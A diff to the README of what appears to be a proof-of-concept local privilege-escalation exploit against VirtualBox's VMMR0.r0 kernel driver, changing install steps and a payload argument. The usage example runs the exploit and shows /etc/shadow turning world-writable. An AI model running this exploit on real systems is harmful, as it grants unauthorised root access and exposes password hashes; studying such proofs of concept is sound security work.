@@ -100,12 +100,7 @@ You need to have python3.5 and python3-pwntools installed (you must be on the
 be merged into master). You also need unalignedrop installed.
 
 ```log
-git clone -b rop_load_add_register_to_stack \
-  https://github.com/pdxjohnny/python3-pwntools
-cd python3-pwntools
-python3.5 setup.py install --user
-pip3.5 install --upgrade --user \
-  git+https://github.com/pdxjohnny/unalignedrop.git
+sudo -E pip3 install -r requirements.txt
 ```
 
 You need to start a virtual machine and make sure that the driver VMMR0.r0
@@ -119,7 +114,7 @@ $ ls -lAf /etc/shadow
 $ rm Makefile
 $ ln -s Makefile.vbox3 Makefile
 $ make clean all
-$ ./poc.py kernel VMMR0.r0 payload 30
+$ ./poc.py kernel VMMR0.r0 payload 42
 $ ls -lAf /etc/shadow
 -rw-rw-rw- 1 root root 806 Aug 29 17:12 /etc/shadow
 ```
